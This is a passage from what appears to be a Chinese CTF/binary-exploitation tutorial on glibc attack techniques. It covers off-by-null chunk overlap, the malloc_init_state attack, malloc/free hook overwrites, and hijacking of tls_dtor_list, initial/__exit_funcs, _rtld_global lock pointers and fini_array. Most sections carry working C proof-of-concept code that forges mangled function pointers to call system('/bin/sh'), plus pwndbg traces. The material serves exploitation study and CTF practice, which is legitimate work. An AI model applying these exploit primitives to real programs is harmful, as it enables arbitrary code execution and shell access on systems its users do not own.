    free(c1);  // c1->a
    a=malloc(0x410);
    ((char *)a)[8]='\x00';  // a->bk=c0
    c1 = malloc(0x410);

    free(c1);
    free(d);  // d->c1
    free(h0);  //merge h0 with d     
    void *h1=malloc(0x4f0+0x20);
    ((char *)h1)[0x500]='\x00';
    void *d1=malloc(0x400);
    c1=malloc(0x410);
    

    free(padding);
    padding=malloc(0x108);
    ((long*)padding)[0x100/8]=0x550;   // h0->prevsize   
    ((char*)padding)[0x108]='\x00';   // h0->size  off by null 
    free(h1);  //merge h1 with c0


    void* split=malloc(0x540);
    printf("split heap address %p \n",split);
    printf("c0 heap address %p \n",c0);
    printf("padding heap address %p \n",padding);
}
```

# malloc_init_state attack 

malloc_consolidate 会根据 global_max_fast 是否为 0 来判断 ptmalloc 是否已经初始化，因此如果能通过任意地址写将 global_max_fast 置 0 然后触发 malloc_consolidate 就可以调用 malloc_init_state 。

```c
static void malloc_consolidate(mstate av){
// malloc_consolidate逻辑
if (get_max_fast () != 0) {
    //global_max_fast不为0,表示ptmalloc已经初始化
    //清理和合并 fastbin，最后都放入unsortedbin
} else {
    //如果global_max_fast为0
    malloc_init_state(av);
    check_malloc_state(av);
    //非debug模式下该宏定义为空
}

}
```
```c
 /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top;

  /* The remainder from the most recent split of a small request */
  mchunkptr last_remainder;

  /* Normal bins packed as described above */
  mchunkptr bins[NBINS * 2 - 2];
```
在 malloc_init_state 中会将 top chunk 指针指向 unsorted bin
```c
static void malloc_init_state (mstate av) {
    int i;
    mbinptr bin;
    for (i = 1; i < NBINS; ++i) {
        bin = bin_at (av, i);
        bin->fd = bin->bk = bin;
        //遍历所有的bins,初始化每个bin的空闲链表为空,即将bin的fb和bk都指向bin本身
    }
#if MORECORE_CONTIGUOUS
    if (av != &main_arena)
#endif
        set_noncontiguous (av);
        //对于非主分配区,需要设置为分配非连续虚拟地址空间
    if (av == &main_arena)
        set_max_fast (DEFAULT_MXFAST);
        //设置fastbin中最大chunk大小
        //只要该全局变量的值非0,也就意味着主分配区初始化了
    av->flags |= FASTCHUNKS_BIT;
    //标识此时分配区无fastbin
    av->top = initial_top (av);
    //#define initial_top(M) (unsorted_chunks(M))
    //#define unsorted_chunks(M) (bin_at(M, 1))
    //#define bin_at(m, i) (mbinptr)(((char *) &((m)->bins[((i) - 1) * 2])) - offsetof (struct malloc_chunk, fd))
    //暂时把top chunk初始化为unsort chunk,仅仅是初始化一个值而已,这个chunk的内容肯定不能用于top chunk来分配内存,主要原因是top chunk不属于任何bin,但ptmalloc中的一些check代码可能需要top chunk属于一个合法的bin
}

```
此时 top chunk 的地址为 &av->bins[0] - 0x10 ，且 size 为之前的 last_remainder 的值(通常来说堆指针都会很大)，只要不断 malloc ，就可以分配到 hook 指针。（__free_hook在main_arena下面）

```bash
pwndbg> p &__free_hook
$3 = (void (**)(void *, const void *)) 0x7f03bc36d8a8 <__free_hook>
pwndbg> p &main_arena
$4 = (struct malloc_state *) 0x7f03bc36bc20 <main_arena>

```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/2d7b2ce6429f44c093a32df14c07b8ba.png)
glibc-2.27 开始 malloc_consolidate 不再调用 malloc_init_state ，该方法失效。

## poc

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>

size_t getlibc()
{
    puts("getlibc");
    size_t libc_addr=puts-0x6d640;
    size_t global_max_fast=libc_addr+0x3ad8f0;
    return global_max_fast;
}

int main()
{   
    setvbuf(stdout, NULL, _IONBF, 0);  
    size_t* chunk1=malloc(0x500);
    malloc(0x20);
    free(chunk1);
    malloc(0x200); // after split is in smallbin range so become last_remainder
    size_t* global_max_fast=getlibc();

    size_t* fastchunk[0x10];
    for(int i=1;i<=8;i++)
    {
        fastchunk[i]=malloc(0x10);
        
    }
    malloc(0x10); //padding
     for(int i=1;i<=8;i++)
    {
        free(fastchunk[i]);// have_fastchunks 
    }  
    printf("global_max_fast %p\n",global_max_fast);
    *global_max_fast=0;  //set  global_max_fast 0
    malloc(0x600+0x1610);    // malloc largebin size strike malloc_consolidate  to make top change

    char* free_hook=malloc(0x20);
    printf("free_hook  %p\n",free_hook);
}
```
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/91c3e5fb450f4f5d803c7f03afafcad9.png)

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/b3513ea79dd84bc5ac33a5be9038594a.png)



#  HOOK
对利用最终获取 shell 的方式除了写 got 表外就是覆盖函数指针。glibc 中存在很多 hook 结构可以利用。
## malloc_hook / realloc_hook
- malloc_hook 调用的函数的参数是size，realloc

修改 fd 指针指向 __realloc_hook 前合适的偏移（通常是 __malloc_hook 往前 0x23 的偏移），两次 malloc(0x60) 申请出该地址的 fake chunk 实现对 __realloc_hook 和 __malloc_hook 的控制。

由于 one_gadget 可能因栈结构不满足条件而失效，可以通过修改 __malloc_hook 为 realloc+偏移 ，修改 __realloc_hook 为 one_gadget 改变栈结构来获取 shell 。

[RoarCtf - pwn](https://n0va-scy.github.io/2022/02/14/RoarCTF/)
[SUCTF招新赛PWN_萌新友好版WP](https://xz.aliyun.com/t/3383?time__1311=n4%2bxnii=G=0Q0=DODgD0x05DIdrFuoraT=eOeC4D)
除了 realloc + 偏移外，还可以通过触发 malloc 报错执行 malloc 来改变栈结构。

> 同时free一个chunk两次，就会触发malloc_printer报错，接着也会调用mallo_hook，如果了malloc_hook的内容为onegadget，在报错过程中就会改变程序执行流程进而去执行onegadget，getshell   
> 可以连续free一个堆块两次来解发malloc_hook，这样做的好处就是在调用malloc_hook前会先调用malloc_printer，所以会改变栈的结构，再利用realloc调偏移就有更大的可能满足onegadget的条件了。


传入的是size
```c
void *(*hook) (size_t, const void *)
  = atomic_forced_read (__malloc_hook);
if (__builtin_expect (hook != NULL, 0))
  return (*hook)(bytes, RETURN_ADDRESS (0));

```
glibc-2.34 起删除了堆相关 hook 。
##  free hook
传入的是释放的堆指针
```c
void (*hook) (void *, const void *)
  = atomic_forced_read (__free_hook);
if (__builtin_expect (hook != NULL, 0))
  {
    (*hook)(mem, RETURN_ADDRESS (0));
    return;
  }

```
free hook 前面没有可供截取的 size 字段（偶尔有，但是由于值一直在变因此没有成功利用），因此很难利用 fast bin attack 来攻击，不过可以利用 house of storm 或 tcache attack 攻击。

free hook 的优势是传入参数为释放的内存，因此参数可控，比如将 free hook 改为 system 然后释放带有 /bin/sh 的字符串可以稳定 get shell 。或者利用 setcontext 的 gadget 来设置寄存器来劫持程序执行流程。

glibc-2.34 起删除了堆相关 hook 。
# exit 利用
[exit源码阅读](https://imcbc.cn/202201/glibc-exit/)
程序通过main正常返回（__libc_start_call_main执行main后会调用exit函数）或者有调用exit函数的地方

```bash
__run_exit_handler函数里面调用了 __call_tls_dtors、_dl_fini、_IO_cleanup、_exit函数，最后是在_exit函数里面利用系统调用结束程序
```

相关源码
```bash
void
exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
libc_hidden_def (exit)

```

```bash
 ► 0x7ffff7c4560b <exit+27>      call   __run_exit_handlers         <__run_exit_handlers>
        rdi: 0
        rsi: 0x7ffff7e1a838 (__exit_funcs) —▸ 0x7ffff7e1bf00 (initial) ◂— 0
        rdx: 1
        rcx: 1

```


接下来__run_exit_handlers会调用__call_tls_dtors 然后遍历initial的fns数组，当flavor==ef_cxa（4）时会解密f->func.cxa.fn指针并调用这个函数，就是_dl_fini
```c
void  attribute_hidden __run_exit_handlers (int status, struct exit_function_list **listp,
		     bool run_list_atexit, bool run_dtors)
{
  /* First, call the TLS destructors.  */
#ifndef SHARED
  if (&__call_tls_dtors != NULL)
#endif
    if (run_dtors)
      __call_tls_dtors ();


  while (true)
    {
      struct exit_function_list *cur;

      __libc_lock_lock (__exit_funcs_lock);

    restart:
      cur = *listp;

      if (cur == NULL)
	{
	  /* Exit processing complete.  We will not allow any more
	     atexit/on_exit registrations.  */
	  __exit_funcs_done = true;
	  __libc_lock_unlock (__exit_funcs_lock);
	  break;
	}

      while (cur->idx > 0)
	{
	  struct exit_function *const f = &cur->fns[--cur->idx];
	  const uint64_t new_exitfn_called = __new_exitfn_called;

	  /* Unlock the list while we call a foreign function.  */
	  __libc_lock_unlock (__exit_funcs_lock);
	  switch (f->flavor)
	    {
	      void (*atfct) (void);
	      void (*onfct) (int status, void *arg);
	      void (*cxafct) (void *arg, int status);

	    case ef_free:
	    case ef_us:
	      break;
	    case ef_on:
	      onfct = f->func.on.fn;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (onfct);
#endif
	      onfct (status, f->func.on.arg);
	      break;
	    case ef_at:
	      atfct = f->func.at;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (atfct);
#endif
	      atfct ();
	      break;
	    case ef_cxa:
	      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
		 we must mark this function as ef_free.  */
	      f->flavor = ef_free;
	      cxafct = f->func.cxa.fn;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (cxafct);
#endif
	      cxafct (f->func.cxa.arg, status);
	      break;
	    }
	  /* Re-lock again before looking at global state.  */
	  __libc_lock_lock (__exit_funcs_lock);

	  if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
	    /* The last exit function, or another thread, has registered
	       more exit functions.  Start the loop over.  */
	    goto restart;
	}

      *listp = cur->next;
      if (*listp != NULL)
	/* Don't free the last element in the chain, this is the statically
	   allocate element.  */
	free (cur);

      __libc_lock_unlock (__exit_funcs_lock);
    }

  if (run_list_atexit)
    RUN_HOOK (__libc_atexit, ());

  _exit (status);
}
```
## 劫持tls_dtor_list 

[https://www.cnblogs.com/hetianlab/p/17682896.html](https://www.cnblogs.com/hetianlab/p/17682896.html)

2.34去除了hook，glibc2.35可利用 劫持tls_dtor_list 来达到效果

```c
struct dtor_list
{
  dtor_func func;
  void *obj;
  struct link_map *map;
  struct dtor_list *next;
};
static __thread struct dtor_list *tls_dtor_list;

void
__call_tls_dtors (void)
{
  while (tls_dtor_list)
    {
      struct dtor_list *cur = tls_dtor_list;
      dtor_func func = cur->func;
#ifdef PTR_DEMANGLE
      PTR_DEMANGLE (func);
#endif
      tls_dtor_list = tls_dtor_list->next;
      func (cur->obj);
      atomic_fetch_add_release (&cur->map->l_tls_dtor_count, -1);
      free (cur);
    }
}
libc_hidden_def (__call_tls_dtors)
```
- 判断tls_dtor_list是否为空，这里`tls_dtor_list是fs:[rbx]，rbx=qword ptr [rip + 0x1a4acf]，对于到gdb中就是x/xg $fs_base-88`

```c
   0x7ffff7e0528a <__call_tls_dtors+10>    mov    rbx, qword ptr [rip + 0x1a4acf]     RBX, [0x7ffff7fa9d60] => 0xffffffffffffffa8
   0x7ffff7e05291 <__call_tls_dtors+17>    mov    rbp, qword ptr fs:[rbx]
 ► 0x7ffff7e05295 <__call_tls_dtors+21>    test   rbp, rbp                            0 & 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ]
   0x7ffff7e05298 <__call_tls_dtors+24>  ✔ je     __call_tls_dtors+93         <__call_tls_dtors+93>
    ↓

pwndbg> x/xg $fs_base-88
0x7ffff7fb14e8:	0x0000000000000000

```

- 不为空则将tls_dtor_list赋值给cur

- 取出函数指针cur->func，通过PTR_DEMANGLE宏解密指针值
   
   rbp就是cur的 值，先将指针循环右移0x11，然后与fs:[0x30]进行异或。循环右移比较好解决，先将指针循环左移即可。但是这个异或值则需要获得fs:[0x30]的值。而且是八个字节的随机值
```bash
0x00007ffff7e052a0 <+32>:	mov    rdx,QWORD PTR [rbp+0x18]
   0x00007ffff7e052a4 <+36>:	mov    rax,QWORD PTR [rbp+0x0]
   0x00007ffff7e052a8 <+40>:	ror    rax,0x11
   0x00007ffff7e052ac <+44>:	xor    rax,QWORD PTR fs:0x30
   0x00007ffff7e052b5 <+53>:	mov    QWORD PTR fs:[rbx],rdx
   0x00007ffff7e052b9 <+57>:	mov    rdi,QWORD PTR [rbp+0x8]
   0x00007ffff7e052bd <+61>:	call   rax
pwndbg> x/xg $fs_base+0x30
0x7ffff7fb1570:	0xad93accbff819efa
```

- 执行函数指针，参数就是dtor_list的偏移八字节开始的八个字节


伪造tls_dtor_list，用堆分配，然后内部伪造好`dtor_func func;
  void *obj;`，func作为函数指针，obj作为第一个参数，然后写tls_dtor_list为伪造的堆地址，由于函数指针会进行解密，所以需要提前加密，需要先异或再循环左移，`异或的fs:[0x30]可通过如下方式得到，可以通过泄露[initial+0x18]的内容，经过循环右移后再与_dl_fini函数的地址异或，就可以得到fs:[0x30]`，或者任意地址读泄露fs:[0x30]或者写篡改fs:[0x30]（发现所在段可读可写）
### poc
- 能写$fs_base里的tls_dtor_list为自己伪造的
- 需要泄露fs:[0x30]（读或者改或者利用已知异或结果来得到`[initial+0x18]循环右移0x11异或fs:[0x30]得到_dl_fini地址`）

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned long long rotate_left(unsigned long long value, int left)
{
    return (value << left) | (value >> (sizeof(unsigned long long) * 8 - left));
    // value << left 将 value 左移 left 位，溢出的高位被丢弃。
    // value >> (bits_in_long_long - left) 将 value 右移 64 - left 位，即把溢出的高位移回低位。
    // 最后，通过按位或 (|) 操作将两部分合并，得到循环左移的结果。
}


int main() {
 unsigned long long fs_base;
 unsigned long long tls_dtor_list_addr;
 unsigned long long random_number;
 void *system_ptr = (void *)&system;
 printf("system:%p\n",system_ptr);
 asm("mov %%fs:0, %0" : "=r" (fs_base));// 使用汇编嵌入获取FS寄存器的值
 printf("Value in FS register: 0x%llx\n", fs_base);
 tls_dtor_list_addr = fs_base - 88;  // tls_dtor_list addr
 random_number = *(unsigned long long *)(fs_base + 0x30);  // random number 
 char *str_bin_sh = malloc(0x20);
 strcpy(str_bin_sh,"/bin/sh");
 void *ptr = malloc(0x20);
 *(unsigned long long *)ptr = rotate_left((unsigned long long)system_ptr ^ random_number,0x11);  // func ptr
 *(unsigned long long *)(ptr + 8) = str_bin_sh;  //arg 
 *(unsigned long long *)tls_dtor_list_addr = ptr;   //set tls_dtor_list
 return 0;
}
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/a88181ba20514fcf826d4fadfce7dfaf.png)

## 改写initial或__exit_funcs
[学习关于exit的利用方法](https://x1ng.top/2020/12/15/%E5%AD%A6%E4%B9%A0%E5%85%B3%E4%BA%8Eexit%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/)
```bash
  0x7ffff7c45463 <__run_exit_handlers+211>    mov    rax, qword ptr [rdx + 0x18]     RAX, [initial+24] => 0xa85b20c9df29e2e6
   0x7ffff7c45467 <__run_exit_handlers+215>    mov    r13, qword ptr [rdx + 0x20]     R13, [initial+32] => 0
   0x7ffff7c4546b <__run_exit_handlers+219>    mov    qword ptr [rdx + 0x10], 0       [initial+16] => 0
   0x7ffff7c45473 <__run_exit_handlers+227>    mov    edx, ebx                        EDX => 0
   0x7ffff7c45475 <__run_exit_handlers+229>    ror    rax, 0x11
   0x7ffff7c45479 <__run_exit_handlers+233>    xor    rax, qword ptr fs:[0x30]        RAX => 140737353912384
   ………………
     0x7ffff7c4548e <__run_exit_handlers+254>    mov    esi, ebp     ESI => 0
   0x7ffff7c45490 <__run_exit_handlers+256>    mov    rdi, r13     RDI => 0
   0x7ffff7c45493 <__run_exit_handlers+259>    call   rax                         <_dl_fini>

```
程序是通过__exit_funcs找到initial的地址，通过[initial+0x18]处的数据经过循环右移0x11位后与fs:[0x30]异或处理得到_dl_fini函数的地址，再将[initial+0x20]处的数据作为第一个参数
```c
pwndbg> tele 0x7ffff7e1bf00 
00:0000│ r15 0x7ffff7e1bf00 (initial) ◂— 0
... ↓        2 skipped
03:0018│     0x7ffff7e1bf18 (initial+24) ◂— 0xa85b20c9df29e2e6
04:0020│     0x7ffff7e1bf20 (initial+32) ◂— 0

 ► 0x7ffff7c4560b <exit+27>      call   __run_exit_handlers         <__run_exit_handlers>
        rdi: 0
        rsi: 0x7ffff7e1a838 (__exit_funcs) —▸ 0x7ffff7e1bf00 (initial) ◂— 0
        rdx: 1
        rcx: 1
```
可以通过任意地址读泄露[initial+0x18]的内容，经过循环右移后再与_dl_fini函数的地址异或，就可以得到fs:[0x30]

之后通过任意地址写将[initial+0x18]的内容改写为system函数地址经过处理后的数据，再将[initial+0x20]的内容改写为”/bin/sh”的地址，就可以完成调用getshell了


在exit函数调用__run_exit_handlers函数的时候也是通过__exit_funcs来将initial作为参数传递的，而__exit_funcs里存储着initial的地址

```c
static struct exit_function_list initial;
struct exit_function_list *__exit_funcs = &initial;
```
并且__exit_funcs所在的段也是可写的

```c
pwndbg> vmmap __exit_funcs
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7e16000     0x7ffff7e1a000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
►   0x7ffff7e1a000     0x7ffff7e1c000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6 +0x1f00
    0x7ffff7e1c000     0x7ffff7e29000 rw-p     d000      0 [anon_7ffff7e1c]

```

所以除了可以修改initial以外，也可以将__exit_funcs覆盖为一个伪造的地址，在这个地址上伪造initial的结构（前0x18字节要保持和initial原来一样），控制程序执行system函数

__exit_funcs和initial都在libc中
```bash
pwndbg> vmmap &__exit_funcs
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7dcb000     0x7ffff7dcf000 r--p     4000 1b2000 /home/llk/Desktop/chunk_poc/glibc/debug_glibc-master/2.31/amd64/lib/libc-2.31.so
►   0x7ffff7dcf000     0x7ffff7dd1000 rw-p     2000 1b6000 /home/llk/Desktop/chunk_poc/glibc/debug_glibc-master/2.31/amd64/lib/libc-2.31.so +0x718
    0x7ffff7dd1000     0x7ffff7dd5000 rw-p     4000      0 [anon_7ffff7dd1]

pwndbg> vmmap &initial
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7dcb000     0x7ffff7dcf000 r--p     4000 1b2000 /home/llk/Desktop/chunk_poc/glibc/debug_glibc-master/2.31/amd64/lib/libc-2.31.so
►   0x7ffff7dcf000     0x7ffff7dd1000 rw-p     2000 1b6000 /home/llk/Desktop/chunk_poc/glibc/debug_glibc-master/2.31/amd64/lib/libc-2.31.so +0x1ca0
    0x7ffff7dd1000     0x7ffff7dd5000 rw-p     4000      0 [anon_7ffff7dd1]

```
### poc
- 泄露[initial+0x18]和_dl_fini函数的地址或者直接泄露fs:[0x30]
- 写__exit_funcs为伪造的initial地址或者写[initial+0x18]和[initial+0x20]

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned long long rotate_left(unsigned long long value, int left)
{
    return (value << left) | (value >> (sizeof(unsigned long long) * 8 - left));
    // value << left 将 value 左移 left 位，溢出的高位被丢弃。
    // value >> (bits_in_long_long - left) 将 value 右移 64 - left 位，即把溢出的高位移回低位。
    // 最后，通过按位或 (|) 操作将两部分合并，得到循环左移的结果。
}

unsigned long long rotate_right(unsigned long long value, int right)
{
    return (value >> right) | (value << (sizeof(unsigned long long) * 8 - right));
}


int main() {
 unsigned long long fs_base;
 unsigned long long tls_dtor_list_addr;
 unsigned long long random_number;
 unsigned long long random_number_caculate;
 char *system_ptr = (char *)&system;
 printf("system:%p\n",system_ptr);
 char *initial = (char *)(&system+0x1a68d0);
 char *_dl_fini = (char *)(&system+0x1c1830);  
 char *__exit_funcs = (char *)(&system+0x1a4528);
 asm("mov %%fs:0, %0" : "=r" (fs_base));// 使用汇编嵌入获取FS寄存器的值
 random_number = *(unsigned long long *)(fs_base + 0x30);  // random number 
 random_number_caculate=rotate_right(*(unsigned long long *)(initial+0x18),0x11)^(unsigned long long )_dl_fini;
 printf("%p random_number_caculate  vs %p leak read random_number\n",random_number_caculate,random_number);
 char *str_bin_sh = malloc(0x20);
 strcpy(str_bin_sh,"/bin/sh");
 char *ptr = malloc(0x40);
 // or change initital 0x18 and 0x20
//  *(unsigned long long *)(initial+0x18) = rotate_left((unsigned long long)system_ptr ^ random_number,0x11);  // func ptr
//  *(unsigned long long *)(initial+0x20) = str_bin_sh;  //arg 

 // or  change __exit_funcs for fake initial addr
//  *(unsigned long long *)(ptr)=0;
//  *(unsigned long long *)(ptr+0x8)=1;
//  *(unsigned long long *)(ptr+0x10)=4;
//  *(unsigned long long *)(ptr+0x18) = rotate_left((unsigned long long)system_ptr ^ random_number,0x11);  // func ptr
//  *(unsigned long long *)(ptr+0x20) = str_bin_sh;  //arg 
//  *(unsigned long long *)__exit_funcs = ptr;   
  return 0;
}
```

## _dl_rtld_unlock_recursive/_dl_rtld_lock_recursive（写_rtld_local）
[http://blog.blackbird.wang/2021/05/20/PWN%E5%AD%A6%E4%B9%A0%E2%80%94exit-hook-%E5%81%B7%E5%AE%B6/](http://blog.blackbird.wang/2021/05/20/PWN%E5%AD%A6%E4%B9%A0%E2%80%94exit-hook-%E5%81%B7%E5%AE%B6/)
_dl_fini中调用_dl_rtld_lock_recursive和_dl_rtld_unlock_recursive的地方如下

```bash

  for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)
    {
      /* Protect against concurrent loads and unloads.  */
      __rtld_lock_lock_recursive (GL(dl_load_lock));
      …………
         else
	{
	  /* Now we can allocate an array to hold all the pointers and
	     copy the pointers in.  */
	  struct link_map *maps[nloaded];
		  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),
			 NULL, true);
			 ………………
			  __rtld_lock_unlock_recursive (GL(dl_load_lock));
		  for (i = 0; i < nmaps; ++i)
	    {
			…………
		}

 pwndbg> print &_rtld_global._dl_load_lock
$1 = (__rtld_lock_recursive_t *) 0x7ffff7ffd968 <_rtld_global+2312>
pwndbg> print &_rtld_global._dl_load_lock.mutex
$2 = (pthread_mutex_t *) 0x7ffff7ffd968 <_rtld_global+2312>

   0x7ffff7fe0dca <_dl_fini+106>    lea    rdi, [rip + 0x1cb97]     RDI => 0x7ffff7ffd968 (_rtld_global+2312) ◂— 0
 ► 0x7ffff7fe0dd1 <_dl_fini+113>    call   qword ptr [rip + 0x1d191]   <rtld_lock_default_lock_recursive>
        rdi: 0x7ffff7ffd968 (_rtld_global+2312) ◂— 0


   0x7ffff7fe0eda <_dl_fini+378>    lea    rdi, [rip + 0x1ca87]     RDI => 0x7ffff7ffd968 (_rtld_global+2312) ◂— 0x100000000
 ► 0x7ffff7fe0ee1 <_dl_fini+385>    call   qword ptr [rip + 0x1d089]   <rtld_lock_default_unlock_recursive>
        rdi: 0x7ffff7ffd968 (_rtld_global+2312) ◂— 0x100000000

```
在__run_exit_handlers函数正常调用_dl_fini函数后，_dl_fini函数又会通过_rtld_lock_unlock_recursive宏定义来调用_rtld_global结构体中的函数指针，但这里用gdb不是很好看，我们用IDA来看，很明显可以看出这里的rtld_lock_default_lock_recursive和rtld_lock_default_unlock_recursive是利用函数指针实现的

```bash
.text:000000000000FA72                 lea     rdi, _rtld_local._dl_load_lock
.text:000000000000FA79                 call    cs:_rtld_local._dl_rtld_lock_recursive

rtld_local._dl_rtld_lock_recursive(&rtld_local._dl_load_lock);

.text:000000000000FA50                 lea     rdi, _rtld_local._dl_load_lock
.text:000000000000FA57                 call    cs:_rtld_local._dl_rtld_unlock_recursive

 rtld_local._dl_rtld_unlock_recursive(&rtld_local._dl_load_lock);
 
00000908 _dl_load_lock   __rtld_lock_recursive_t ?
……
00000F08 _dl_rtld_lock_recursive dq ?            ; XREF: dl_main+3D/w
00000F08                                         ; do_lookup_x+51A/r ... ; offset
00000F10 _dl_rtld_unlock_recursive dq ?          ; XREF: dl_main+4B/w
```

调用_rtld_global._dl_rtld_lock_recursive时的参数rdi是&_rtld_global._dl_load_lock.mutex，我们可以将_rtld_global._dl_load_lock.mutex改为`/bin/sh\x00`

```bash
pwndbg> p _rtld_global

_dl_load_lock = {
    mutex = {
      __data = {
        __lock = 0,
        __count = 1,
        __owner = 0,
        __nusers = 0,
        __kind = 1,
        __spins = 0,
        __elision = 0,
        __list = {
          __prev = 0x0,
          __next = 0x0
        }
      },
      __size = "\000\000\000\000\001", '\000' <repeats 11 times>, "\001", '\000' <repeats 22 times>,
      __align = 4294967296
    }
  },

  ……
   _dl_rtld_lock_recursive = 0x7ffff7dd5fb0 <rtld_lock_default_lock_recursive>,
  _dl_rtld_unlock_recursive = 0x7ffff7dd5fc0 <rtld_lock_default_unlock_recursive>,
	……

```
由于_rtld_global所在的段是可读可写的，所以可以更改_rtld_global的_dl_rtld_unlock_recursive成员或者_dl_rtld_lock_recursive成员为system地址或者one_gadget地址，然后再更改参数_rtld_global._dl_load_lock.mutex为`/bin/sh\x00`

注意`_rtld_global`在ld段里

libc2.27利用libc地址读来泄露`_rtld_global`地址或者直接能泄露ld地址根据偏移得到`_rtld_global`地址也行

```cpp
pwndbg> libc
libc : 0x7f45314d4000
pwndbg> tele 0x3aede8+0x7f45314d4000
00:0000│  0x7f4531882de8 —▸ 0x7f4531aae060 (_rtld_local) —▸ 0x7f4531aaf170 —▸ 0x556bfe717000 ◂— 0x10102464c457f

```

```bash
pwndbg> vmmap &_rtld_global
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  27000 /home/llk/Desktop/chunk_poc/glibc/debug_glibc-master/2.31/amd64/lib/ld-2.31.so
►   0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  28000 /home/llk/Desktop/chunk_poc/glibc/debug_glibc-master/2.31/amd64/lib/ld-2.31.so +0x60
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]

```
glibc-2.34 起 __rtld_lock_lock_recursive 和 __rtld_lock_unlock_recursive 定义发生改变，该 hook 失效。

```c
# define __rtld_lock_lock_recursive(NAME) \
  __pthread_mutex_lock (&(NAME).mutex)

# define __rtld_lock_unlock_recursive(NAME) \
  __pthread_mutex_unlock (&(NAME).mutex)
```
### poc

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main() {
 unsigned long long fs_base;
 unsigned long long tls_dtor_list_addr;
 unsigned long long _dl_rtld_lock_recursive;
 unsigned long long _dl_rtld_unlock_recursive;
 unsigned long long _dl_rtld_lock_recursive_addr;
 unsigned long long _dl_rtld_unlock_recursive_addr;
 char *system_ptr = (char *)&system;
 printf("system:%p\n",system_ptr);
 char *_rtld_global_addr = (char *)(system_ptr+0x36d668);
 char *_rtld_global=*(unsigned long long *)_rtld_global_addr;
 _dl_rtld_lock_recursive_addr = (_rtld_global + 0xf00);
 _dl_rtld_unlock_recursive_addr = (_rtld_global + 0xf08);  
 printf("%p _dl_rtld_lock_recursive_addr  vs %p _dl_rtld_unlock_recursive_addr\n",_dl_rtld_lock_recursive_addr,_dl_rtld_unlock_recursive_addr);
 _dl_rtld_lock_recursive = *(unsigned long long *)(_rtld_global + 0xf00);
 _dl_rtld_unlock_recursive = *(unsigned long long *)(_rtld_global + 0xf08);  
 char*_dl_load_lock_mutex=(_rtld_global+0x908);  
 printf("%p _dl_rtld_lock_recursive  vs %p _dl_rtld_unlock_recursive\n",_dl_rtld_lock_recursive,_dl_rtld_unlock_recursive);
 *(unsigned long long *)_dl_rtld_lock_recursive_addr=system_ptr; 
 //*(unsigned long long *)_dl_rtld_unlock_recursive_addr=system_ptr; 
 strncpy(_dl_load_lock_mutex,"/bin/sh\x00",8);

  return 0;
}
```

## 劫持fini_array/劫持l->l_addr或者l->l_info[DT_FINI_ARRAY]
_dl_fini中会调用`fini_array`中的函数
```bash
 R14  0x555555557df8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5555555550e0 (__do_global_dtors_aux) ◂— endbr64 
 
 这里的参数是残留的
 
 pwndbg> print &_rtld_global._dl_load_lock
$1 = (__rtld_lock_recursive_t *) 0x7ffff7ffd968 <_rtld_global+2312>
pwndbg> print &_rtld_global._dl_load_lock.mutex
$2 = (pthread_mutex_t *) 0x7ffff7ffd968 <_rtld_global+2312>


 ► 0x7ffff7fe0f68 <_dl_fini+520>    call   qword ptr [r14]             <__do_global_dtors_aux>
        rdi: 0x7ffff7ffd968 (_rtld_global+2312) ◂— 0
        rsi: 0x555555557df8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5555555550e0 (__do_global_dtors_aux) ◂— endbr64 
        rdx: 1
        rcx: 0

 [19]     0x555555557df8->0x555555557e00 at 0x00002df8: .fini_array ALLOC LOAD DATA HAS_CONTENTS

pwndbg> tele 0x555555557df8
00:0000│ rsi r14 0x555555557df8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5555555550e0 (__do_global_dtors_aux) ◂— endbr64 

 if (l->l_info[DT_FINI_ARRAY] != NULL)
			{
			  ElfW(Addr) *array =
			    (ElfW(Addr) *) (l->l_addr
					    + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
			  unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
					    / sizeof (ElfW(Addr)));
			  while (i-- > 0)
			    ((fini_t) array[i]) ();
			}
pwndbg> p l
$7 = (struct link_map *) 0x7f99c0c282e0
pwndbg> p *l
$8 = {
  l_addr = 94328970739712,
  l_name = 0x7f99c0c28888 "",
  l_ld = 0x55caaccb3e00,
  l_next = 0x7f99c0c28890,
  l_prev = 0x0,
  l_real = 0x7f99c0c282e0,
  l_ns = 0,
  l_libname = 0x7f99c0c28870,
